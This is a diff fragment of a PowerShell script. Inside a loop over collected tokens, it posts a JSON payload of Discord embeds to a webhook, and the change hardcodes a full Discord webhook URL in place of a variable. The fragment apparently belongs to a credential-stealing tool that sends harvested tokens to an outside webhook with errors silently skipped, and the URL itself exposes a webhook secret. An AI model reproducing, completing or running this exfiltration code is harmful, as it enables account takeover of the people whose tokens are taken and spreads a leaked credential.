@@ -81,7 +81,7 @@ foreach ($token in $tokens) {
             embeds = @($embed)
         } | ConvertTo-Json -Depth 5
 
-        Invoke-RestMethod -Uri $webhook_url -Method Post -Body $payload -ContentType 'application/json'
+        Invoke-RestMethod -Uri https://discord.com/api/webhooks/1398638353590521876/nS_F5qoPn6adJI3NSg4rA4zaOqQL_rUOpEJx9HkdZjD6pjo7-A1kP3nsbZJACxWIi8f7 -Method Post -Body $payload -ContentType 'application/json'
     } catch {
         continue
     }
